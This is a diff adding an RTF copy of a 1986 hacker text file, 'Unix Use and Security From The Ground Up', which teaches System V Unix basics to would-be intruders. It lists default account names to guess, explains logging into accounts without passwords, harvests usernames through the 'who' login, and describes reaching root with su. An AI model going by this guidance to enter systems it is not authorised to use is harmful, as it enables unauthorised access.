@@ -1,0 +1,2827 @@
+{\rtf1\ansi\deff0{\fonttbl{\f0\fnil\fcharset0 Courier New;}}
+{\*\generator Msftedit 5.41.15.1507;}\viewkind4\uc1\pard\lang1033\f0\fs20 1\'be\'00\'00\'00\'ab\'00\'00\'00\'00\'00\'00\'00\'00\'ea)\'02\'00U\'04\'e3\'04\'e3\'04\'e3\'04\'e3\'04\'e3\'04\'00\'00\'00\'00\'00\'00\'00\'00\'00\'00\'00\'00\'00\'00\'00\'00\'00\'00\'00\'00\'00\'00\'00\'00\'00\'00\'00\'00\'00\'00\'00\'00\'00\'00\'00\'00\'00\'00\'00\'00\'00\'00\'00\'00\'00\'00\'00\'00\'00\'00\'00\'00\'00\'00\'00\'00\'00\'00\'00\'00\'00\'00\'00\'00\'00\'00\'e4\'04\'00\'00\'00\'00\'00\'00\'00\'00\'00\'00\'00\'00\'00\'00\'00\'00\'00\'00\'00\'00\'00\'00\'00\'00\'00\'00\'00\'00\'00\'00                *************************************************\par
+                *************************************************\par
+                **                                             **\par
+                **         Unix Use and Security From          **\par
+                **              The Ground Up                  **\par
+                **                                             **\par
+                **                   by                        **\par
+                **                                             **\par
+                **              The Prophet                    **\par
+                **                                             **\par
+                **                                             **\par
+                *************************************************\par
+                *************************************************\par
+\par
+December 5, 1986.\par
+\par
+INTRODUCTION\par
+------------\par
+        The Unix operating system is one of the most heavily used mainframe \par
+operating systems today. It runs on many different computers (Dec VAX's, AT&T's \par
+3bx series, PDP-11's, and just about any other you can think of- including \par
+PC's), and there are many different, but pretty much similar, versions of it. \par
+These Unix clones go by many different names- here are the most common: Xenix, \par
+Ultrix, Ros, IX/370 (for the IBM 370), PCIX (for the IBM PC), and Berkely (BSD) \par
+Unix. This file will concentrate on AT&T System V Unix, probably the most \par
+heavily used version. (The next most heavily used is Berkely Unix.) This file \par
+will cover just about everything all but THE most advanced hacker will need to \par
+know about the Unix system, from the most rodent information to advanced \par
+hacking techniques. This is the second version of this file, and as I discover \par
+any errors or new tricks, I will update it. This file is, to the best of my \par
+knowledge, totally accurate, however, and the techniques in it will work just \par
+as described herein. Note, that these techniques will work on System V Unix. \par
+Not necessarily all, but most, should work on most other versions of Unix as \par
+well. Later, if this file is received well, and there is demand for another, I \par
+will release a file on yet more advanced techniques. If you wish to contact me, \par
+I can be reached several ways. First, on these boards:\par
+\par
+Shadow Spawn   219-659-1503\par
+Private Sector 201-366-4431 (As prophet, not The Prophet...some rodent stole\par
+                             my name.)\par
+Ripco          312-528-5020\par
+Stalag 13      215-657-8523\par
+Phreak Klass 2600 806-799-0016\par
+\par
+Or at this voice message system:\par
+\par
+800-556-7001\par
+Box 7023\par
+\par
+I welcome any suggestions, corrections, or feedback of any kind. And lastly, \par
+thanks for taking the time to read this:\par
+\par
+THE USUAL DISCLAIMER:\par
+---------------------\par
+        This file is for [of course] informational purposes only. <Snicker> I \par
+don't take responsibility for anything anyone does after reading this file.\par
+_______________________________________________________________________________\par
+\par
+\par
+IDENTIFYING UNIX SYSTEMS AND LOGGING IN\par
+---------------------------------------\par
+        A Unix system can easily be identified by its prompts. When you first \par
+connect to a Unix system, you should receive the login prompt, which is usually \par
+"Login:" (Note, that the first character may or may not be capitalized.) On \par
+some systems, this prompt may be ";Login:" or "User:" (Again, the first letter \par
+may or may not be capitalized.) This may be preceded by a short message, \par
+(usually something like "WARNING!!! This system is for authorized users \par
+only!"), the name of the company that owns the system, or the uucp network name \par
+of the system. (The uucp facilities will be explained in detail later.) At this \par
+point, you should enter the user name and press return. (You should be in \par
+lowercase if your terminal supports it.) You should then receive the password \par
+prompt, "Password:" (And yet again, the "P" may or may not be capitalized.) At \par
+this point, you should enter your password and press return. If you have \par
+specified the correct username/password pair, you will then be admitted into \par
+the system. If you have entered a non-existant username or an incorrect \par
+password, you will receive the message "Login incorrect" and will be returned \par
+to the login prompt. There is little information given before login, and there \par
+is no way to find valid usernames from pre-login information.\par
+        There are no "default" passwords in Unix. When the system is initially \par
+set up, none of the default accounts or any of the accounts created by the \par
+system operators has a password, until the system operator or the account owner \par
+set one for the account. Often, lazy system operators and unwary users do not \par
+bother to password many (and in some cases, all) of these accounts. To log in \par
+under an account that doesn't have a password, you have only to enter the \par
+username at the login prompt. \par
+        You may encounter some occasional error messages when attempting to log \par
+in under certain accounts. Here are some of the more common messages, and their \par
+causes:\par
+        1. "Unable to change directory to /usr/whatever"-This means that the \par
+                account's home directory, the directory which it is placed in\par
+                upon logon, does not exist. On some systems, this may prevent\par
+                you from logging under that account, and you will be returned\par
+                to the login prompt. On other systems, you will simply be\par
+                placed in the root directory. If this is the case, you will\par
+                see the message "Changing directory to '/'".\par
+        2. "No shell"-this means that the account's shell, or command \par
+                interpreter does not exist. On some systems, the account will\par
+                not be allowed to log in, and you will be returned to the login\par
+                prompt. On other systems, the account will be admitted into the\par
+                system using a default shell, usually the Bourne shell. (The \par
+                shell will be explained later.) If this is the case, you will\par
+                see the message "Using /bin/sh".\par
+\par
+\par
+UNIX ACCOUNTS\par
+-------------\par
+        There are two types of Unix accounts-user and superuser accounts. User \par
+accounts are the normal user accounts. These accounts have no privileges. \par
+Superuser accounts are the system operator accounts. These accounts have full \par
+privileges, and are not bound by the file and directory protections of other \par
+users. In Unix, there is no hierarchy of privileges-either an account has full \par
+privileges, or it has none.\par
+        Unix usernames are up to 14 characters long, but usually are within the \par
+range of 1-8. The usernames can contain almost any characters, including \par
+control and special characters. (The accounts will usually not contain the \par
+characters @, control-d, control-j, or control-x, as these characters have \par
+special meanings to the Unix operating system.) The Unix system comes initially \par
+configured with quite a few default accounts, some of which are superuser and \par
+some of which are only user-level accounts. Here is a list of the default \par
+accounts which usually have superuser privileges:\par
+root (Always!)\par
+makefsys\par
+mountfsys\par
+umountfsys\par
+checkfsys\par
+\par
+The root account is always present on the system, and always has superuser \par
+capabilities. (Note: most Unix System V systems come initially set up with a \par
+security feature that prevents superuser accounts from logging in remotely. If \par
+you attempt to log in under a superuser account remotely on a system with this \par
+feature, you will receive the message "Not on console", and will be refused \par
+admission to the operating system. This will NOT prevent you from using \par
+superuser accounts remotely-you simply have to log in under a user account and \par
+then switch over to a superuser account using the su utility, which will be \par
+described later.)\par
+Here is a list of the user-level default accounts:\par
+lp\par
+daemon\par
+trouble\par
+nuucp\par
+uucp\par
+bin\par
+rje\par
+adm\par
+sysadm\par
+sync\par
+\par
+The bin account, although it is only a user account, is particularly powerful, \par
+as it has ownership of many of the system's important directories and files. \par
+Although these are the only default accounts on System V Unix, there are many \par
+other accounts which I have found to be common to many Unix systems. Here is a \par
+list of some of the accounts I have found on many Unix systems:\par
+batch           admin           user            demo            test\par
+field           unix            guest           pub             public\par
+standard        games           general         student         help\par
+gsa             tty             lpadmin\par
+\par
+Also try variations on the account names, such as rje1, rje2, user1, user2, \par
+etc. Also, try variations on people's names and initials, such as doej, doe,\par
+john, johnd, jjd, etc.\par
+        No matter what the format for the usernames, one thing is common to all \par
+systems-almost all of the usernames will begin with a lowercase letter. There \par
+is a good reason for this-when logging into the system, if the first character \par
+of the username you type in is in uppr-case, the system automatically assumes \par
+that your terminal does not support lower-case. It will then send all output to \par
+you in upper-case, with characters that are supposed to be upper-case preceded \par
+by a backslash ("\\", the Unix escape character), to differentiate them from the \par
+characters which are meant to be in lower-case. Unix *always* differentiates \par
+between the cases, so it is best to stay in lower-case while on the system.\par
+        As mentioned before, there are no "default" passwords on Unix. When an \par
+account is created, it has no password, until the superuser or the account's \par
+owner sets one for it. Unix passwords are a maximum of 11 characters. The \par
+password may contain any character, and the system distinguishes between upper \par
+and lower case characters. Many Unix systems implement a special security \par
+feature under which passwords must contain at least 2 non-alphanumeric \par
+characters (similar to Compuserve's password protection). Yet another password \par
+security feature of Unix allows the superuser to set an expiration date on \par
+users' passwords.\par
+\par
+\par
+COMMAND LOGINS\par
+--------------\par
+        Many systems have accounts known as "command logins". These are \par
+accounts that log in, execute a single command, and are then logged out. These \par
+accounts rarely have passwords. Here is a list of common command logins:\par
+who     -This is a particularly useful command login. When you enter this at\par
+        the username of a system with this particular account, the system will\par
+        display a list of the users currently on the system. A good way to get\par
+        valid usernames to hack.\par
+time    -Not very useful. Just displays the time.\par
+date    -Ditto the above, but displays the current date. Great if you don't \par
+        have a calendar.\par
+sync    -This default account is sometimes set up as a command login. It merely\par
+        executes the sync command, which causes any data which is meant to be\par
+        stored to be written to disk.\par
+\par
+UNIX SPECIAL CHARACTERS\par
+-----------------------\par
+        The Unix operating system interprets certain characters in special \par
+ways. Provided here is a list of those special characters, and their meanings \par
+to the Unix operating system:\par
+\par
+Control-D       -This is the Unix end-of-file character.\par
+Control-J       -Some systems interpret this, rather than Control-M, as the \par
+                return character, while others may use both. The vast majority, \par
+                however, will only use Control-M.\par
+Control-Delete  -This is the Unix kill character. It will automatically end \par
+                your current process.\par
+@               -Some systems use this as the kill character.\par
+\\               -This is the Unix escape character. Its main use it to \par
+                differentiate between upper- and lower-case characters when \par
+                logged in on a terminal that only supports upper-case. For \par
+                instance, if you wanted to send the command "cd /Mrs/data",\par
+                (never mind what it does right now), you would type this:\par
+                (this is how it would look on your upper-case only terminal)\par
+                CD /\\MRS/DATA\par
+                The backslash before the M would let the system know that the M \par
+                supposed to be upper-case, while the others would simply be \par
+                interpreted as lower-case.\par
+\par
+        The characters will rarely be used in usernames and passwords because \par
+of the way they are interpreted. Note, however, that these values may usually \par
+be changed once inside the system using the stty command, which will be \par
+explained later. for instance, the end of file character could be changed to \par
+control-A if you wished.\par
+\par
+THE UNIX SHELL\par
+--------------\par
+        The Unix shell is the command interpreter program that accepts your \par
+input and carries out your commands. It is NOT the operating system itself, it \par
+is the interface between the user and the operating system. The shell is a \par
+program that is executed when you are logged in, and when you end the shell \par
+program, you are logged out of the system. There is nothing special about the \par
+shell program-it is just a regular program, like any other on the Unix system. \par
+In fact, once you are logged on, you can execute another shell just as you \par
+would execute a program. This ability, to run multiple shell levels, can be \par
+used to perform some interesting tricks that will be detailed later in this \par
+file. There is also more than one kind of shell. All the shells perform the \par
+same basic function of interpreting the user's commands, but there are a few \par
+differences. Here is a list of the different shells, their unique \par
+characteristics, and how to tell which shell you are using:\par
+\par
+Shell\par
+-----\par
+sh      -This is the Bourne shell, the standard shell of Unix System V, and the\par
+        focus of this file. This shell gives user-level accounts a command \par
+        prompt of "$", and "#" for superuser accounts. On Berkely BSD Unix,\par
+        this shell gives an ampersand ("&") prompt.\par
+\par
+csh     -This is the C shell, developed by the Berkely University Science \par
+        department. This shell is pretty much the same as the Bourne shell, but\par
+        features different shell programming control structures [shell \par
+        programming will be explained later, in the section on Unix software\par
+        development], and has a few luxuries such as aliasing (giving a command \par
+        or a series of commands a new name), and it keeps a history of the \par
+        commands you enter. This shell gives a "%" prompt for user accounts and\par
+        a "#" prompt for superuser accounts. \par
+\par
+ksh     -This is the new, Korn shell. This shell combines features of both the \par
+        Bourne shell and the C shell. It boasts the Bourne shell's easier shell\par
+        programming, along with the C shell's aliasing and history. Its prompts\par
+        are "$" for users and "#" for superusers.\par
+\par
+rsh     -This is the restricted Bourne shell. It is used for accounts that the\par
+        superuser wishes to restrict the commands available to. It will not \par
+        allow you to execute commands outside of your searchpath (which will be\par
+        explained later, also, in the section on software development), and \par
+        will not let you change directories or change the values of shell\par
+        variables. In all other respects, it is similar to the Bourne shell. A \par
+        later section of this file will detail ways to overcome the\par
+        restrictions of this shell.\par
+\par
+ua      -This is a lousy, menu-driven shell for the AT&T Unix PC. (Yes, there\par
+        are some of those with dialups!) It implements a lousy windowing\par
+        system that is SLOOOW, even at 2400 baud. Luckily, you can exit to the\par
+        Bourne shell from the ua shell.\par
+\par
+        These are by no means all of the shells you will run across. These are \par
+only the "official" shells provided by the distributors of the Unix operating \par
+system. I've run across many "home-made" shells in my time. Also, any compiled \par
+program can be used as a shell. For instance, I've used systems run by \par
+businesses where one account logged in using an accounting program as a shell. \par
+This prevented the account from being used to do anything other than use the \par
+accounting program. Other good examples of this are the command logins-the who \par
+command login, for example, uses the who program as its shell. When the program \par
+is finished, the account is logged out. You will most definitely encounter \par
+other such accounts as you hack Unix.\par
+\par
+UNIX FILES AND DIRECTORIES\par
+--------------------------\par
+        Unix files and directories are referenced with pathnames, a la MS-DOS.\par
+If you are familiar with MS-DOs, then you should have no problem understanding \par
+this section. Unix files and directories are referenced in the almost the exact \par
+same way-the only difference is that it uses the "/" character, not the \par
+backslash, to separate the directories in the pathname.\par
+        Pathnames are a simple concept to understand, but are difficult to \par
+explain. Imagine the system's files and directories laid out in a tree fashion, \par
+like this:\par
+                                / (root directory)\par
+                                :\par
+                                :\par
+                        -------------------------\par
+                        :                       :\par
+                        :                       :\par
+                        usr (dir)              bill (dir)\par
+                        :                       :\par
+                 --------------           --------------\par
+                 :            :           :            :\par
+              junk (file)  source (dir)  memo (file)  names (file)\par
+                              :\par
+\par
+"/" is the root directory. This is the top directory in the system tree, and \par
+all other files and directories are referenced in relation to this directory. \par
+The root directory has 2 subdirectories in it, "usr" and "bill". In the usr \par
+directory, there is a file called "junk" and an empty directory called \par
+"source". In the directory bill, there are 2 files, "memo" and "names". You \par
+specify pathnames by starting at the top of the system, "/", and tracing your \par
+way down the system tree to the file or directory you wish to reference, \par
+separating each directory you must pass through to get to it with a slash. For \par
+instance, the pathname of the file "junk" would be "/usr/junk". The pathname of \par
+the usr directory would be "/usr". The pathname of the source directory would \par
+be "/usr/source". The pathname of the bill directory would be "/bill", and the \par
+pathnames of the 2 files which reside in it would be "/bill/memo" and \par
+"/bill/names".\par
+        Files and directories can also be referenced by their base names if \par
+they are in your current directory. For instance, if you were in the directory \par
+"usr", you could reference the file "/usr/junk" by its base name, "junk". If \par
+you were in the root directory, you could reference the bill directory by its \par
+base name, "bill". You can reference the file directly above your current \par
+directory in the system tree as ".." and your current directory can be \par
+referenced as "."\par
+        Unix file and directory names can be up to 14 characters in length. The\par
+filename can contain any ASCII character, including control characters, except\par
+a space. It may contain both upper- and lower-case, and Unix does distinguish\par
+between the two. Unix does not use filename extensions, a la VMS or MS-DOS, to \par
+show the kind of file a file is. A period, in Unix, is just another character \par
+in the filename, not a separator between 2 fields in the name. File names which \par
+begin with a period are called "hidden" files-that is, they are only revealed \par
+if you issue a special command.\par
+        There are 3 kinds of files in Unix. These are text files, binary files,\par
+and device files. Text files are just what you'd think they are from the name-\par
+files of ASCII text, just like what you're reading right now. Binary files are\par
+executable machine-code files. (There are also executable text files, called \par
+shell scripts, that will be explained in detail in the section on Unix software \par
+development.) Device files are files that represent the system's I/O devices-\par
+disk drives, terminals, etc. Remember, that Unix was created as an enviroment \par
+for software development. Its designers wished for programs written for Unix \par
+systems to be as transportable between different models of machines running \par
+the operating system as possible. By representing the I/O devices as files, \par
+they eliminated the incompatability in the code that handled I/O. The program \par
+simply has to read and write from/to the file, and the Unix operating system \par
+handles the system-dependant details.\par
+\par
+BASIC UNIX COMMANDS\par
+-------------------\par
+        This section will describe some basic Unix commands, and detail how to \par
+get further help on-line. It will briefly provide the syntax for a few commands \par
+you will find necessary to know in order to find your way around on the system.\par
+        Unix will usually only require that you use the base name of a file or \par
+directory you wish to reference if it is in the directory you are currently in. \par
+Most commands will also let you specify full pathnames if you wish to reference \par
+files in other parts of the system. Most commands will also let you use several \par
+wildcard characters when referencing files and directories. These are:\par
+?       -This means to accept any single character in the place of the question\par
+        mark. For instance, "t?m" would include both "tom" and "tim".\par
+\par
+*       -This means to accept any character, group of characters, or nothing in\par
+        the position of the asterisk. For example, "t*m" would include "thom",\par
+        "tom", and "tim".\par
+[]      -This means to accept any character within the brackets in the position \par
+        of the brackets. For instance, "t[oia]m" would include "tom", "tim", \par
+        and "tam". You can also specify a range of characters in the brackets \par
+        by using a hyphen. For instance, "t[a-c]m" would include "tam", "tbm",\par
+        and "tcm".\par
+\par
+        Most commands and programs in Unix take their input from the keyboard \par
+and send their output to the screen. With most commands and programs, however, \par
+you can instruct them to draw their input from a text file and redirect their \par
+output to another file instead. For instance, assume there is a program on the \par
+system called "encrypter", that takes its input from the keyboard, encrypts it, \par
+and displays the encrypted data on the screen. You could instruct the program \par
+to take its input, instead, from a previously prepared text file using the \par
+input redirection character, "<". In Unix, as in MS-DOs (which is based in part \par
+on Unix), you execute a program by typing its name. You wish the program to \par
+take its input from a file in the directory you are currently in called \par
+"top_secret". You would type "encrypter < top_secret". The program would then \par
+read in the contents of the file top_secret and encrypt it, then print out the \par
+encrypted form on the screen. Suppose you wanted to use the encrypter program \par
+to encrypt files you wished to keep private? You could redirect the encrypted \par
+output from the screen into another file. To do this, you would use the output \par
+redirection character, ">". Say, you wished to save the output in a file called \par
+"private". You would type "encrypter < top_secret > private". The encrypter \par
+program would then read in the contents of the file top_secret and write the \par
+encrypted output into the file "private". Nothing would be displayed to the \par
+screen. If the file private does not exist, it will be created. If it \par
+previously existed, its contents will be erased and replaced with the output \par
+from the encrypter program. Perhaps you would want to add to the contents of a \par
+file rather than replace its contents? This is done with ">>". The command \par
+"encrypter < top_secret >> private" would append the output from the encrypter \par
+to the current contents of the file private. Again, if the file private does \par
+not already exist, it will be created.\par
+        Most commands have one or more options that you can specify. These are \par
+placed after the command itself in the command line, and preceded by a hyphen. \par
+For instance, let's say that the encrypter program had an option called \par
+"x", which caused it to use a different encoding algorithm. You would \par
+specify it by typing "encrypter -x". If a command has two or more options, you\par
+can usually specify one or more together in a stream. For instance, let's say \par
+that the encrypter program has 2 options, x and y. You could specify both like \par
+this: "encrypter -xy". If one or more of the options requires an argument, for \par
+example the x option requires a 2 character key, you can specify the options \par
+separately, like this: "encrypter -xaa -y", where aa is the 2-character key. \par
+        The pipe character, "|", is used to channel the output of one command \par
+or program into the input of another. For instance, suppose you had a command \par
+called "report" that formatted documents into report format, and you had a file \par
+called "myreport" that you wished to view in the report format. You could type:\par
+"cat myreport" | report". This would type out the contents of the file myreport \par
+to the report command rather than the screen, and the report command would \par
+format it and display it on the screen. (Note: this example could have been \par
+done with I/O redirection by typing "report < myreport"...but it makes a good \par
+example of the use of pipes.)\par
+        You can choose to execute commands and programs in the background-that \par
+is, the command executes, but you are free to carry out other tasks in the \par
+meantime. To do this, type in the command line, followed by " &". For instance, \par
+"rm * &" would delete all the files in the directory, but your terminal would\par
+not be tied up. You would still be free to perform other tasks. When you do \par
+this, the system will print out a number and then return you to the system \par
+prompt. This number is the process number of the command. Process numbers will \par
+be explained later in this section in the entry for the command "ps". The \par
+command can be stopped before its completion with the kill command, also \par
+explained in this section. Example:\par
+        $rm * &\par
+        1234\par
+        $\par
+\par
+Note that when you use background processing, the command or program will still \par
+takes its input from the keyboard (standard input device) and send its output \par
+to the screen (standard output device), so if you wish for the command to work \par
+in the background without disturbing you, you must redirect its input (if any) \par
+and its output (if it's to the screen).\par
+\par
+THE COMMANDS\par
+------------\par
+\par
+ls      -This command lists the files and subdirectories in a directory. If you \par
+        simply type "ls", it will display the files in your current directory. \par
+        You can also specify the pathname of another directory, and it will \par
+        display the files in it. It will not display hidden files (files whose\par
+        name begins with a period). \par
+\par
+        Options:\par
+        a       -This option will display all files, including hidden files.\par
+\par
+        Example:\par
+        $ ls -a\par
+\par
+        .       ..      junk    source\par
+        $\par
+\par
+cd      -This is the command used to move from one directory to another. To go \par
+        to a directory directly below your current directory, type "cd \par
+        <dirname>". To move up to the directory directly above your current \par
+        directory, type "cd .."  You can also jump to any directory in the \par
+        system from any other directory in the system by specifying the path-\par
+        name of the directory you wish to go to, such as "cd /usr/source".\par
+\par
+        Example:\par
+        $cd /usr/source\par
+        $\par
+\par
+pwd     -This prints out the pathname of the directory you are currently in. \par
+        Useful if you forget where you're at in the system tree.\par
+\par
+        Example:\par
+        $pwd\par
+        /usr/source\par
+\par
+cat     -Displays the contents of a text file on the screen. The correct syntax \par
+        is "cat <filename>". You can use basenames or pathnames.\par
+\par
+        Example:\par
+        $cat memo\par
+        Bill, \par
+          Remember to feed the cat!\par
+        -Martha\par
+        $\par
+\par
+rm      -This deletes a file. Syntax: "rm <filename>".\par
+\par
+        Example:\par
+        $rm junk\par
+        $\par
+\par
+cp      -Copies a file. Syntax: "cp file1 file2", where file1 is the file you\par
+        wish to copy, and file2 is the name of the copy you wish to create. If \par
+        file2 already exists, it will be overwritten. You may specify pathnames\par
+        for one or both arguments.\par
+\par
+        Example:\par
+        $cp /usr/junk /usr/junk.backup\par
+\par
+stty    -Displays/sets your terminal characteristics. To display the current \par
+        settings, type "stty". To change a setting, specify one of the options\par
+        listed below.\par
+\par
+   Options:\par
+   echo         -System echoes back your input.\par
+   noecho       -System doesn't echo your input.\par
+   intr 'arg'   -Sets the break character. The format is '^c' for control-c, \par
+                etc. '' means no break character.\par
+   erase 'arg'  -Sets the backspace character. Format is '^h' for control-h,\par
+                etc. '' means no backspace character.\par
+   kill 'arg'   -Sets the kill character (which means to ignore the last line\par
+                you typed). Format is the same as for intr and erase, \par
+                '^[character]', with '' meaning no kill character.\par
+\par
+        Example:\par
+        $stty intr '^c' erase '^h'\par
+        $stty\par
+        stty -echo intr '^c' erase '^h' kill '^x'\par
+        \par
+lpr     -This command prints out a file on the Unix system's printer, for you \par
+        to drop by and pick up (if you dare!) The format is "lpr <filename>".\par
+\par
+        Example:\par
+        $lp junk\par
+\par
+ed      -This is a text file line editor. The format is "edit <filename>". The \par
+        file you wish to modify is not modified directly by the editor; it is \par
+        loaded into a buffer instead, and the changes are only made when you \par
+        issue a write command. If the file you are editing does not already \par
+        exist, it will be created as soon as issue the first write command. \par
+        When you first issue the edit command, you will be placed at the\par
+        command prompt, ":" Here is where you issue the various commands. Here\par
+        is list of some of the basic editor commands.\par
+        #       -This is any number, such as 1, 2, etc. This will move you down \par
+                to that line of the file and display it.\par
+        d       -This deletes the line you are currently at. You will then be\par
+                moved to the previous line, which will be displayed.\par
+        a       -Begin adding lines to the file, just after the line that you \par
+                are currently on. This command will put you in the text input\par
+                mode. Simply type in the text you wish to add. To return to the\par
+                command mode, type return to get to an empty line, and press\par
+                the break key (which is whatever character you have set as your\par
+                break key). It is important to set the break character with \par
+                stty before you use the editor!\par
+        /       -Searches for a pattern in the file. For example, "/junk" would\par
+                search the file from your current line down for the first line\par
+                which contains the string "junk", and will move you to that \par
+                line if it finds one.\par
+        i       -Insert. Works similar to a, except that the text is inserted\par
+                before the line you are currently on.\par
+        p       -Prints out a line or lines in the buffer. "p" by itself will\par
+                display your current line. "#p" will display the line "#". \par
+                You may also specify a range of lines, such as "1,3p" which\par
+                will display lines 1-3. "1,$p" will print out the entire file.\par
+        w       -Write the changes in the buffer to the file.\par
+        q       -Quit the editor.\par
+\par
+        Example:\par
+        $edit myfile\par
+        Editing "myfile" [new file]\par
+        0 lines, 0 characters\par
+        :a\par
+        I am adding stupid text to myfile.\par
+        This is a test.\par
+        ^c [this is assumed as a default break character in this example]\par
+        :1,$p\par
+        I am adding stupid text to myfile.\par
+        This is a test.\par
+        :2\par
+        This is a test.\par
+        :d\par
+        I am adding stupid text to myfile.\par
+        :w\par
+        :q\par
+        $\par
+\par
+grep    -this command searches for strings of text in text files. The format is\par
+        grep [string] [file]. It will print out every line in the file that \par
+         contains the string you specified.\par
+\par
+        Options:\par
+        v       -Invert. This will print out every line that DOESN'T contain\par
+                the string you specified.\par
+\par
+        Example:\par
+        $ grep you letter\par
+        your momma!\par
+        I think you're going to get caught.\par
+        $\par
+\par
+who     -This will show the users currently logged onto the system.\par
+\par
+        Example:\par
+        $ who\par
+\par
+        root    console Mar 10  01:00\par
+        uucp    contty  Mar 30  13:00\par
+        bill    tty03   Mar 30  12:15\par
+        $\par
+        Now, to explain the above output: the first field is the username of \par
+        the account. The second field shows which terminal the account is on.\par
+        Console is, always, the system console itself. On many systems where\par
+        there is only one dialup line, the terminal for that line is usually \par
+        called contty. the tty## terminals can usually be either dialups or\par
+        local terminals. The last fields show the date and time that the user\par
+        logged on. In the example above, let's assume that the current time and\par
+        date is March 30, and the time is 1:00. Notice that the time is in 24 \par
+        hour format. Now, notice that the root (superuser) account logged in on\par
+        March 10! Some systems leave the root account logged in all the time on\par
+        the console. So, if this is done on a system you are using, how can you\par
+        tell if the system operator is really online or not? Use the ps \par
+        command, explained next.\par
+\par
+ps      -This command displays information about system processes.\par
+\par
+        Options:\par
+        u       -this displays information on a specific user's processes. For\par
+                instance, to display the root account's processes:\par
+                $ ps -uroot\par
+\par
+                PID     TTY     TIME    CMD\par
+                1234    console 01:00   sh\par
+                1675    ?       00:00   cron\par
+                1687    console 13:00   who\par
+                1780    tty09   12:03   sh\par
+\par
+                Now, to explain that: The first field is the process number. \par
+                Each and every time you start a processes, running a program,\par
+                issueing a command, etc., that process is assigned a unique \par
+                number. The second is which terminal the process is being run\par
+                on. The third field is when the process was started. The last\par
+                field is the base name of the program or command being run.\par
+                A user's lowest process number is his login (shell) process.\par
+                Note that the lowerst process in the above example is 1234. \par
+                This process is being run on the console tty, which means the\par
+                superuser is logged on at the system console. Note the ? as the\par
+                tty in the next entry, for the cron process. You can ignore any\par
+                processes with a question mark as the terminal. These processes\par
+                are not bewing carried out by a user; they are being carried\par
+                out by the system under that user's id. Next, note the entry\par
+                for process # 1687, on the console terminal, "who". this means\par
+                that the superuser is executing the who command...which means\par
+                he is currently actively on-line. The next entry is interest-\par
+                ing...it shows that the root user has a shell process on the \par
+                terminal tty09! This means that someone else is logged in\par
+                under the root account, on tty09. If more than one person is\par
+                using an account, this option will display information for all\par
+                of them, unless you specify the next option...\par
+\par
+        t       -This allows you to select processes run on a specific term-\par
+                inal. For example:\par
+                $ps -t console\par
+                will show all the processes currently being run on the console.\par
+\par
+                Example:\par
+                Remember, options can usually be combined. This will show all\par
+                the root user's processes being run on the system console:\par
+                $ ps -uroot -tconsole\par
+\par
+                PID     TTY     TIME    CMD\par
+                1234    console 01:00   sh\par
+                1687    console 13:00   who\par
+                $\par
+\par
+kill    -Kills processes. Syntax: kill [-#] process#. You must know the process\par
+        number to kill it. You can, optionally, specify an option of 1-9, to\par
+        determine the power of the kill command. Certain kinds of processes,\par
+        like shell processes, require more power to kill. Kill -9 will stop any\par
+        process. You must have superuser capabilities fo kill another user's\par
+        processes (unless he's using your account).\par
+\par
+        Example:\par
+        $kill -9 1234\par
+        1234 killed.\par
+        $\par
+\par
+write   -This command is for on-line realtime user to user communications. To \par
+        communicate with a user, type "write <username>". If more than one\par
+        person is logged in under that user name, you must specify a specific\par
+        terminal you wish to speak to. When you do this, the person you wish\par
+        to communicate with will see:\par
+        Message from [your account name] tty## [<--your terminal]\par
+\par
+        Now you can type messages, and they will be displayed on that person's\par
+        terminal when you press return. When you are finished, press control-D\par
+        to quit.\par
+\par
+        Example:\par
+        $ write root\par
+        Fuck you I'm a hacker!  [This is not advised.]\par
+        ^d\par
+        $\par
+\par
+mail    -The Unix mail facilities, used to send/receive mail. To send mail, \par
+        type "mail <username>". Enter your message and press control-d to send.\par
+        To read your mail, type "mail". Your first letter will be displayed,\par
+        and then you will be given a "?" prompt.  \par
+        Here are the legal commands you give at this point: \par
+        ##      -Read message number ##.\par
+        d       -Delete last message read.\par
+        +       -Go to next message.\par
+        -       -Move back one message.\par
+        m       -Send mail to user.\par
+        s       -Save last message read. You can specify the name of the file\par
+                to which it is saved, or it will be saved to the default file,\par
+                mbox.\par
+        w       -Same as s, but will save the message without the mail file\par
+                header.\par
+        x       -Exit without deleting messages that have been read.\par
+        q       -Exit, deleting messages that have been read.\par
+        p       -Print last message read again.\par
+        ?       -Lists these commands.\par
+\par
+        Examples:\par
+        To send mail:\par
+        $ mail root\par
+        Hi bill! This is a nice system.\par
+        -John\par
+        ^d\par
+        $\par
+        To read mail:\par
+        $ mail\par
+        From john Thu Mar 13 02:00:00  1986\par
+        Hi bill! This is a nice system.\par
+        -John\par
+        ? d\par
+        Message deleted.\par
+        ?q\par
+        $\par
+\par
+crypt   -This is the Unix file encryption utility. Type "crypt". You will then\par
+        be prompted to enter the password. You then enter the text. Each line\par
+        is encrypted when you press return, and the encrypted form is displayed\par
+        on the screen. So, to encrypt a file, you must use I/O redirection.\par
+        Type "crypt [password] < [file1] > [file2]". This will encrypt the con-\par
+        tents of file1 and place the encrypted output in file2. If file 2 does\par
+        not exist, it will be created.\par
+\par
+passwd  -This is the command used to change the password of an account. The\par
+        format is "passwd <account>". You must have superuser capabilities to\par
+        change the password for any account other than the one you are logged\par
+        in under. To change the password of the account you are currently\par
+        using, simply type "passwd". You will then be prompted to enter the\par
+        current password. Next, you will be asked to enter the new password.\par
+        Then you will be asked to verify the new password. If you verify the\par
+        old password correctly, the password change will be complete. (Note:\par
+        some systems use a security feature which forces you to use at least\par
+        2 non-alphanumeric characters in the password. If this is the case with\par
+        the system you are on, you will be informed so if you try to enter a\par
+        new password that does not contain at least 2 non-alphanumeric char-\par
+        acters.)\par
+\par
+su      -This command is used to temporarily assume the id of another account.\par
+        the format is "su <account>". If you don't specify an account, the\par
+        default root is assumed. If the account has no password, you will then\par
+        assume that account's identity. If it does have a password, you will\par
+        be prompted to enter it. Beware of hacking passwords like this, as the\par
+        system keeps a log of all attempted uses, both successful and un-\par
+        successful, and which account you attempted to access.\par
+\par
+mkdir   -This command creates a directory. the format is "mkdir <dirname>".\par
+\par
+rmdir   -This command deletes a directory. The directory must be empty first.\par
+        The format is "rmdir <dirname>".\par
+\par
+mv      -Renames a file. The syntax is "mv [oldname] [newname]". You can use\par
+        full pathnames, but the new name must have the same pathname as the\par
+        old name, except for the filename itself.\par
+\par
+-------------------------------------------------------------------------------\par
+        Further help can usually be gained from the system itself. Most systems \par
+feature on-line entries from the Unix System User's Manual. You can read these \par
+entries using the man command. The format is "man <command>". Some Unix System \par
+V systems also feature a menu-driven help facility. Simply type "help" to \par
+access it. This one will provide you with a list of commands, as well as with \par
+the manual entries for the commands.\par
